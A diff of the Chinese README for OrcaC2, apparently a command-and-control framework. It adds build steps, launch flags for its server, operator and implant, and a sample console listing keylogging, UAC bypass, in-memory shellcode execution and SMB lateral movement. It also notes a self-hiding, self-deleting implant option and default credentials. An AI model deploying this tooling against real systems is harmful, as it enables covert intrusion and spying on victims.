@@ -6,7 +6,11 @@
 
 由三部分组成：`Orca_Server`(服务端)、`Orca_Master`(控制端)、`Orca_Puppet`(被控端)。
 
-<img src="https://i.imgur.com/OXMHJqi.jpg" alt="logo.jpg" />
+<p align="center">
+  <img src="https://i.imgur.com/OXMHJqi.jpg" width=400 height=400 alt="ST"/>
+</p>
+
+
 
 ## 特性&功能
 
@@ -28,6 +32,167 @@
 - 多协程端口爆破（支持ftp、ssh、wmi、wmihash、smb、mssql、oracle、mysql、rdp、postgres、redis、memcached、mongodb）
 - 远程ssh命令执行/文件上传/文件下载
 - 远程smb命令执行(无回显)/文件上传（通过rpc服务执行命令，类似wmiexec；通过ipc$上传文件，类似psexec）
+
+
+
+## 安装
+
+> 编译源码前，需要先在本地安装：go (>=1.18) 、gcc 
+
+### Windows系统下编译
+
+下载并解压源码包后，直接运行`install.bat`文件即可。
+
+
+
+### Linux系统下编译
+
+```shell
+$ git clone https://github.com/Ptkatz/OrcaC2.git
+$ cd OrcaC2
+$ chmod +x install.sh
+$ ./install.sh
+```
+
+
+
+## 使用
+
+### Orca_Server端
+
+存在配置文件(`./conf/app.ini`)与数据库文件(`./db/team.db`、`./qqwry.dat`)的情况下双击即可运行
+
+
+
+### Orca_Puppet端
+
+```console
+Orca_Puppet.exe -host <Server端IP:端口> -debug -hide
+```
+
+参数说明：
+
+- -host:     连接到Server端的地址，默认为127.0.0.1:6000
+- -debug:    打开调试信息，默认为false
+- -hide:     在Linux系统下可以伪造进程名，并删除自身程序文件
+
+
+
+### Orca_Master端
+
+```console
+Orca_Master.exe -u <用户名> -p <密码> -H <Server端IP:端口>
+```
+
+参数说明：
+
+- -u | --username:     连接到Server端的用户名
+- -p | --password:    连接到Server端的密码
+- -H | --host:    连接到Server端的地址，默认为127.0.0.1:6000
+
+> Server端数据库中默认的用户名和密码为 admin:123456
+
+
+
+连接成功：
+
+```console
+C:\Users\blood\Desktop\OrcaC2\out\master>Orca_Master.exe -u admin -p 123456 -H 127.0.0.1:6000
+OrcaC2 Master 0.10.0
+                                ,;;;;;;,
+                           {;g##7    9####h;;;;,,
+                         {E777777779###########F7'
+                        ~`           7##########;
+                        <:_           "##########h
+                         -(:__          VG#3######,
+                          ~-=:=:=:__     -""d#####]
+                              ~--====_      {Q####]
+                           {;;,   ~-<=:     l#####
+                            9###.   ~==:   {Q###F'
+                            g###h,  =::` {a####7
+                        ;;;########gss;g####P7
+                        7777777777G###7777'
+
+
+                ;g77h;    lE779;    {;P79]      g#,
+               l#    #]   lE;;gF    #]         gLJ#,
+                7N;;F7    l# "9h    "7L;g]    gF777#,
+                                                       by: Ptkatz
+
+2022/09/24 00:03:01 [*] login success
+Orca[admin] » help
+
+OrcaC2 command line tool
+
+Commands:
+  clear     clear the screen
+  exit      exit the shell
+  help      use 'help [command]' for command help
+  list, ls  list hosts
+  port      use port scan or port brute
+  proxy     activate the proxy function
+  select    select the host id waiting to be operated
+  ssh       connects to target host over the SSH protocol
+
+Orca[admin] » ls
++----+---------------+----------------+---------------------------------+-----------+-------+
+| ID |   HOSTNAME    |       IP       |               OS                | PRIVILEGE | PORT  |
++----+---------------+----------------+---------------------------------+-----------+-------+
+|  1 | ULYSSES/blood | 127.0.0.1      | Microsoft Windows 11 Home China | user      |  5434 |
+|  2 | Ulysses/root  | 172.27.157.191 | Kali GNU/Linux Rolling          | root      | 35510 |
++----+---------------+----------------+---------------------------------+-----------+-------+
+Orca[admin] » select 1
+Orca[admin] → 127.0.0.1 » help
+
+OrcaC2 command line tool
+
+Commands:
+  assembly     manage the CLR and execute .NET assemblies
+  back         back to the main menu
+  clear        clear the screen
+  close        close the selected remote client
+  exec         execute shellcode or pe in memory
+  exit         exit the shell
+  file         execute file upload or download
+  getadmin     bypass uac to get system administrator privileges
+  help         use 'help [command]' for command help
+  info         get basic information of remote host
+  keylogger    get information entered by the remote host through the keyboard
+  list, ls     list hosts
+  port         use port scan or port brute
+  process, ps  manage remote host processes
+  proxy        activate the proxy function
+  screen       screenshot and screensteam
+  select       select the host id waiting to be operated
+  shell, sh    send command to remote host
+  smb          lateral movement through the ipc$ pipe
+  ssh          connects to target host over the SSH protocol
+
+Orca[admin] → 127.0.0.1 »
+```
+
+
+
+## TODO
+
+- [ ] 支持Websocket SSL
+- [ ] Dump Hash
+- [ ] Powershell模块加载
+- [ ] 完善Linux-memfd无文件执行
+- [ ] 内网中间人攻击
+- [ ] Linux系统的屏幕截图
+- [ ] 基于VNC的远程桌面
+- [ ] Webshell管理
+- [ ] WireGuard搭建隧道接入内网
+- [ ] 对MacOS系统更多支持
+- [ ] 根据payload生成被控端加载器
+- [ ] 使用C实现远程加载器加载被控端，解决被控端体积过大问题
+- [ ] 多端口监听器
+- [ ] ...
+
+
+
+> 由于最近要学Rust，这个项目最近不会有太多更新，见谅
 
 
 
@@ -62,29 +227,6 @@ https://github.com/niudaii/crack
 
 
 **由衷感谢以上项目的作者/团队对开源的贡献与支持**
-
-
-
-## TODO
-
-- [ ] 支持Websocket SSL
-- [ ] Dump Hash
-- [ ] Powershell模块加载
-- [ ] 完善Linux-memfd无文件执行
-- [ ] 内网中间人攻击
-- [ ] Linux系统的屏幕截图
-- [ ] 基于VNC的远程桌面
-- [ ] Webshell管理
-- [ ] WireGuard搭建隧道接入内网
-- [ ] 对MacOS系统更多支持
-- [ ] 根据payload生成被控端加载器
-- [ ] 使用C实现远程加载器加载被控端，解决被控端体积过大问题
-- [ ] 多端口监听器
-- [ ] ...
-
-
-
-> 由于最近要学Rust，这个项目最近不会有太多更新，见谅
 
 
 
